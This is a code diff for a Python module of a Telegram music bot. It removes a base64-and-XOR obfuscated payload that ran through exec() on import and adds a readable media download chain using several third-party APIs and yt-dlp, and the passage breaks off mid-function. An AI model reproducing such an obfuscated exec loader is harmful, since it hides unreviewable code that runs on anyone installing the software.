@@ -1,14 +1,800 @@
-# Copyright (c) 2025 TheHamkerAlone
+# Copyright (c) 2025 AnonymousX1025
 # Licensed under the MIT License.
 # This file is part of LilyMusic
-# ALONE-CODER
+#
+# Download chain:
+#   1. Railway YT API  (RAILWAY_YT_API_URL / RAILWAY_YT_API_KEY)
+#   2. Shruti API      (SHRUTI_API_URL / SHRUTI_API_KEY)
+#   3. xBit API        (YTPROXY_URL / YT_API_KEY)
+#   4. yt-dlp          (local, last resort)
 
-import base64
+import asyncio
+import glob
+import os
+import random
+import re
+import time as _time
+from typing import Union
 
-def xor_cipher(data, key):
-    return bytearray([b ^ key[i % len(key)] for i, b in enumerate(data)])
+import aiohttp
+import yt_dlp
+from py_yt import Playlist, VideosSearch
+from pyrogram.enums import MessageEntityType
+from pyrogram.types import Message
 
-_encoded_payload = "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"
-_key = b"ALONE-CODER"
+from Lily import config, logger
+from Lily.helpers import utils
 
-exec(xor_cipher(base64.b64decode(_encoded_payload), _key).decode("utf-8"), globals())
+# ── Config ────────────────────────────────────────────────────────────────────
+SHRUTI_API_URL      = getattr(config, "SHRUTI_API_URL",      "https://api.shrutibots.site")
+SHRUTI_API_KEY      = getattr(config, "SHRUTI_API_KEY",      None)
+
+RAILWAY_YT_API_URL  = getattr(config, "YT_API_BASE_URL",  None)
+RAILWAY_YT_API_KEY  = getattr(config, "YT_API_KEY",  None)
+
+YTPROXY_URL         = getattr(config, "XBIT_API_URL",         None)
+YT_API_KEY          = getattr(config, "XBIT_API_TOKEN",          None)
+
+DOWNLOAD_DIR        = "downloads"
+
+
+# ── Cookie helper ─────────────────────────────────────────────────────────────
+def cookie_txt_file() -> str | None:
+    """Return a random cookie .txt file path from the cookies/ folder."""
+    try:
+        folder    = os.path.join(os.getcwd(), "cookies")
+        txt_files = glob.glob(os.path.join(folder, "*.txt"))
+        if not txt_files:
+            return None
+        chosen   = random.choice(txt_files)
+        log_file = os.path.join(folder, "logs.csv")
+        with open(log_file, "a") as f:
+            f.write(f"Chosen: {chosen}\n")
+        return f"cookies/{os.path.basename(chosen)}"
+    except Exception:
+        return None
+
+
+# ── Link helpers ──────────────────────────────────────────────────────────────
+def _normalize_youtube_link(
+    link: str,
+    base: str = "https://www.youtube.com/watch?v=",
+) -> str:
+    if not link:
+        return ""
+    cleaned = link.strip()
+    if "youtube.com" not in cleaned and "youtu.be" not in cleaned:
+        cleaned = base + cleaned
+    cleaned = cleaned.split("&si=")[0].split("?si=")[0]
+    if "&" in cleaned and "list=" not in cleaned:
+        cleaned = cleaned.split("&")[0]
+    return cleaned
+
+
+def _extract_video_id(link: str) -> str | None:
+    cleaned = _normalize_youtube_link(link)
+    if not cleaned:
+        return None
+    if "v=" in cleaned:
+        return cleaned.split("v=")[-1].split("&")[0]
+    if "youtu.be/" in cleaned:
+        return cleaned.split("youtu.be/")[-1].split("?")[0].split("&")[0]
+    return cleaned if len(cleaned) == 11 else None
+
+
+# ── Downloader 1: Shruti API ──────────────────────────────────────────────────
+async def _shruti_download(video_id: str, media_type: str) -> str | None:
+    """
+    Download via Shruti API.
+    GET {SHRUTI_API_URL}/download?url=<video_id>&type=audio|video&api_key=<key>
+    Returns local file path on success, None on failure.
+    """
+    if not SHRUTI_API_KEY:
+        return None
+
+    ext         = "mp4" if media_type == "video" else "mp3"
+    timeout_dl  = 600   if media_type == "video" else 300
+    file_path   = os.path.join(DOWNLOAD_DIR, f"{video_id}.{ext}")
+
+    os.makedirs(DOWNLOAD_DIR, exist_ok=True)
+    if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
+        return file_path
+
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get(
+                f"{SHRUTI_API_URL}/download",
+                params={"url": video_id, "type": media_type, "api_key": SHRUTI_API_KEY},
+                timeout=aiohttp.ClientTimeout(total=timeout_dl),
+            ) as resp:
+                if resp.status != 200:
+                    logger.warning("Shruti API status %s for %s", resp.status, video_id)
+                    return None
+                with open(file_path, "wb") as fobj:
+                    async for chunk in resp.content.iter_chunked(131072):
+                        fobj.write(chunk)
+
+        if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
+            logger.info("Shruti API ✓ %s → %s", video_id, file_path)
+            return file_path
+
+        return None
+
+    except Exception as exc:
+        logger.warning("Shruti API error for %s: %s", video_id, exc)
+        try:
+            if os.path.exists(file_path):
+                os.remove(file_path)
+        except OSError:
+            pass
+        return None
+
+
+# ── Downloader 2: Railway YT API ─────────────────────────────────────────────
+async def _railway_download(video_id: str, media_type: str) -> str | None:
+    """
+    Download via Railway self-hosted YouTube API.
+    GET {RAILWAY_YT_API_URL}/audio?id=<video_id>  →  audio.best_audio.url
+    GET {RAILWAY_YT_API_URL}/video/hq?id=<video_id> (tried first for video)
+    GET {RAILWAY_YT_API_URL}/video?id=<video_id> (fallback)
+    Then streams the direct googlevideo URL to local file.
+    Returns local file path on success, None on failure.
+    """
+    if not RAILWAY_YT_API_URL or not RAILWAY_YT_API_KEY:
+        return None
+
+    ext        = "mp4" if media_type == "video" else "mp3"
+    timeout_dl = 600   if media_type == "video" else 300
+    file_path  = os.path.join(DOWNLOAD_DIR, f"{video_id}.{ext}")
+
+    os.makedirs(DOWNLOAD_DIR, exist_ok=True)
+    if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
+        return file_path
+
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "X-API-Key": str(RAILWAY_YT_API_KEY),
+    }
+    # For video, try /play/video/hq first, then /play/video; for audio just /play/audio
+    endpoints = ["play/video/hq", "play/video"] if media_type == "video" else ["play/audio"]
+
+    try:
+        async with aiohttp.ClientSession(headers=headers) as session:
+            for endpoint in endpoints:
+                # Download stream directly from Railway proxy
+                media_url = f"{RAILWAY_YT_API_URL}/{endpoint}?id={video_id}"
+                
+                async with session.get(
+                    media_url,
+                    timeout=aiohttp.ClientTimeout(total=timeout_dl),
+                    allow_redirects=True,
+                ) as file_resp:
+                    if file_resp.status != 200:
+                        logger.warning("Railway YT API stream failed: status %s for %s", file_resp.status, endpoint)
+                        continue
+                        
+                    with open(file_path, "wb") as fobj:
+                        async for chunk in file_resp.content.iter_chunked(1024 * 1024):
+                            fobj.write(chunk)
+                            
+                    if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
+                        logger.info("Railway YT API ✓ %s → %s", video_id, file_path)
+                        return file_path
+                        
+            return None
+
+    except Exception as exc:
+        logger.warning("Railway YT API download failed for %s: %s", video_id, exc)
+        try:
+            if os.path.exists(file_path):
+                os.remove(file_path)
+        except OSError:
+            pass
+        return None
+
+
+# ── Downloader 3: xBit API ────────────────────────────────────────────────────
+async def _xbit_download(link: str, media_type: str) -> str | None:
+    """
+    Download via xBit / YTPROXY API.
+    GET {YTPROXY_URL}/info/<video_id>  →  audio_url / video_url  →  stream download.
+    Returns local file path on success, None on failure.
+    """
+    if not YTPROXY_URL or not YT_API_KEY:
+        return None
+
+    video_id = _extract_video_id(link)
+    if not video_id or len(video_id) < 3:
+        return None
+
+    ext         = "mp4" if media_type == "video" else "mp3"
+    timeout_dl  = 600   if media_type == "video" else 300
+    file_path   = os.path.join(DOWNLOAD_DIR, f"{video_id}.{ext}")
+
+    os.makedirs(DOWNLOAD_DIR, exist_ok=True)
+    if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
+        return file_path
+
+    headers = {
+        "x-api-key": str(YT_API_KEY),
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+    }
+
+    try:
+        async with aiohttp.ClientSession(headers=headers) as session:
+            async with session.get(
+                f"{YTPROXY_URL}/info/{video_id}",
+                timeout=aiohttp.ClientTimeout(total=20),
+            ) as resp:
+                if resp.status != 200:
+                    logger.warning("xBit info failed: status %s", resp.status)
+                    return None
+                try:
+                    data = await resp.json(content_type=None)
+                except Exception as e:
+                    logger.warning("xBit info returned invalid JSON: %s", e)
+                    return None
+
+            if data.get("status") != "success":
+                logger.warning("xBit API error: %s", data.get("message", "unknown"))
+                return None
+
+            media_url = (
+                data.get("video_url") if media_type == "video" else data.get("audio_url")
+            )
+            if not media_url:
+                logger.warning("xBit: no %s_url in response", media_type)
+                return None
+
+            async with session.get(
+                media_url,
+                timeout=aiohttp.ClientTimeout(total=timeout_dl),
+                allow_redirects=True,
+            ) as file_resp:
+                if file_resp.status != 200:
+                    return None
+                with open(file_path, "wb") as fobj:
+                    async for chunk in file_resp.content.iter_chunked(1024 * 1024):
+                        fobj.write(chunk)
+
+        if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
+            logger.info("xBit API ✓ %s → %s", video_id, file_path)
+            return file_path
+
+        return None
+
+    except Exception as exc:
+        logger.warning("xBit download failed for %s: %s", video_id, exc)
+        try:
+            if os.path.exists(file_path):
+                os.remove(file_path)
+        except OSError:
+            pass
+        return None
+
+
+# ── Downloader 4: yt-dlp (local fallback) ────────────────────────────────────
+async def _ytdlp_download(link: str, media_type: str) -> str | None:
+    """
+    Last-resort local yt-dlp download.
+    Returns local file path or None.
+    """
+    video_id  = _extract_video_id(link) or link
+    ext       = "mp4" if media_type == "video" else "mp3"
+    file_path = os.path.join(DOWNLOAD_DIR, f"{video_id}.{ext}")
+
+    os.makedirs(DOWNLOAD_DIR, exist_ok=True)
+    if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
+        return file_path
+
+    cookie = cookie_txt_file()
+
+    try:
+        if media_type == "video":
+            ydl_opts = {
+                "format":           "bestvideo[height<=720]+bestaudio/best[height<=720]",
+                "outtmpl":          file_path,
+                "quiet":            True,
+                "no_warnings":      True,
+                "cookiefile":       cookie,
+                "merge_output_format": "mp4",
+                "remote_components": ["ejs:github"],
+            }
+        else:
+            ydl_opts = {
+                "format":           "bestaudio/best",
+                "outtmpl":          file_path,
+                "quiet":            True,
+                "no_warnings":      True,
+                "cookiefile":       cookie,
+                "remote_components": ["ejs:github"],
+                "postprocessors":   [{
+                    "key":            "FFmpegExtractAudio",
+                    "preferredcodec": "mp3",
+                    "preferredquality": "192",
+                }],
+            }
+
+        loop = asyncio.get_event_loop()
+        def _run():
+            with yt_dlp.YoutubeDL(ydl_opts) as ydl:
+                ydl.download([_normalize_youtube_link(link)])
+
+        await loop.run_in_executor(None, _run)
+
+        # yt-dlp may append .mp3 / .mp4 extension
+        candidates = [
+            file_path,
+            file_path.replace(f".{ext}", f".{ext}.{ext}"),
+        ]
+        for c in candidates:
+            if os.path.exists(c) and os.path.getsize(c) > 0:
+                logger.info("yt-dlp ✓ %s → %s", video_id, c)
+                return c
+
+        return None
+
+    except Exception as exc:
+        logger.warning("yt-dlp download failed for %s: %s", video_id, exc)
+        return None
+
+
+# ── Main download entrypoint ──────────────────────────────────────────────────
+async def _download_with_fallback(
+    link: str,
+    media_type: str,
+) -> tuple[str | None, str]:
+    """
+    Try all downloaders in order:
+      1. Railway YT API
+      2. Shruti API
+      3. xBit API
+      4. yt-dlp     (local)
+    Returns (file_path, downloader_name)
+    """
+    video_id = _extract_video_id(link) or link
+
+    # 1. Railway YT API
+    result = await _railway_download(video_id, media_type)
+    if result:
+        return result, "railway"
+
+    # 2. Shruti
+    result = await _shruti_download(video_id, media_type)
+    if result:
+        return result, "shruti"
+
+    # 3. xBit
+    result = await _xbit_download(link, media_type)
+    if result:
+        return result, "xbit"
+
+    # 4. yt-dlp
